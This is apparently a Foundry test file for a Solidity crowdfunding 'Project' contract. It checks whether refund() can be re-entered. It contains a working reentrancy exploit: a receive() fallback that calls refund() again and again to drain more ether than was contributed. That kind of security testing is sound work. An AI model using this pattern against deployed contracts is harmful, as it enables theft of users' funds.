// SPDX-License-Identifier: UNLICENSED 
pragma solidity ^0.8.19;

import "../src/ProjectFactory.sol";
import "../src/Project.sol";

import "forge-std/console.sol";
import "forge-std/Test.sol";

contract TestReentrancy is Test {

    Project project;
    uint iterations = 0;

    function setUp() public {

        ProjectFactory factory = new ProjectFactory();
        project = Project(factory.create(100 ether, "Test", "TST"));
        vm.deal(address(project), 1 ether);
    }

    function testReentrancy() public { 
        vm.deal(address(this), 0.02 ether);
        project.contribute{value: 0.02 ether}();
        vm.warp(block.timestamp + 31 days); // warp to after deadline
        project.refund();

        assertTrue((address(this).balance > 0.02 ether), "We should have earned some eth");

    }

    receive() external payable {
        console.log('current balance = ', address(this).balance);
        try project.refund() {

        } catch (bytes memory) {
            return;
        }
    }
}